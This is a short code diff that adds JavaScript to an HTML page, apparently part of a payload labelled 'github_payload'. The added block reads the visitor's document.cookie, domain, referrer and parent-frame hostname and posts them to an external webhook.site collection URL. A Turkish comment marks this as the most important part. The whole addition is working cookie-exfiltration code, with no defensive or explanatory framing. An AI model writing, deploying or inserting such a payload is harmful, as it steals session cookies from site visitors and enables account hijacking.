@@ -27,6 +27,23 @@
         cookies: document.cookie,
         test: 'github_payload'
     });
+
+    // Webhook'a direkt gönder - EN ÖNEMLİ KISIM
+    fetch('https://webhook.site/702e64e6-a3b1-4c90-b2ff-d53f3db32498', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            cookies: document.cookie,
+            domain: document.domain,
+            referrer: document.referrer,
+            iframe_test: true,
+            parent_domain: window.parent.location.hostname
+        })
+    }).then(() => {
+        console.log('Data sent to webhook');
+    }).catch(e => {
+        console.log('Webhook error:', e);
+    });
     </script>
 </body>
 </html>
